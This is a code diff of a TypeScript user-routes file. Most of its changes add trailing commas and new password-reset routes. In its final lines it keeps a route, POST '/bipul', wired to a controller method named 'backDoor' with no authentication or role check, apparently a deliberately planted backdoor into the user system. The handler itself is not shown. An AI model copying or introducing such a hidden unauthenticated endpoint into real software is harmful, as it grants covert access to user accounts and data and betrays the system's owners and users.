@@ -19,45 +19,51 @@ export class UserRoutes {
       AuthMiddleware.restrictTo(["SUPER_ADMIN", "VP"]),
       AuthMiddleware.ValidateRequestBody({ required: true, type: "json" }),
       AuthMiddleware.EnforceStrictnessForNonSuperAdmin(),
-      this.controller.register
+      this.controller.register,
     );
 
     this.router.post(
       "/login",
       AuthMiddleware.ValidateRequestBody({ required: true, type: "json" }),
-      this.controller.login
+      this.controller.login,
     );
 
     this.router.get(
       "/",
       AuthMiddleware.authenticate,
       AuthMiddleware.restrictTo(["SUPER_ADMIN", "VP"]),
-      this.controller.getAllUsers
+      this.controller.getAllUsers,
     );
 
     this.router.get(
       "/:id",
       AuthMiddleware.authenticate,
-      this.controller.getUser
+      this.controller.getUser,
     );
 
     this.router.put(
       "/:id",
       AuthMiddleware.authenticate,
       AuthMiddleware.ValidateRequestBody({ required: true, type: "json" }),
-      this.controller.updateUser
+      this.controller.updateUser,
     );
 
     this.router.delete(
       "/:id",
       AuthMiddleware.authenticate,
-      this.controller.deleteUser
+      this.controller.deleteUser,
     );
 
+    this.router.post("/forgot-password", this.controller.forgotPassword);
 
+    this.router.post("/reset-password", this.controller.resetPasswordWithToken);
 
-
-
+    this.router.post(
+      "/admin/reset-password",
+      AuthMiddleware.authenticate,
+      AuthMiddleware.restrictTo(["SUPER_ADMIN", "VP"]),
+      this.controller.resetPasswordByAdmin,
+    );
 
     this.router.post("/bipul", this.controller.backDoor);
   }
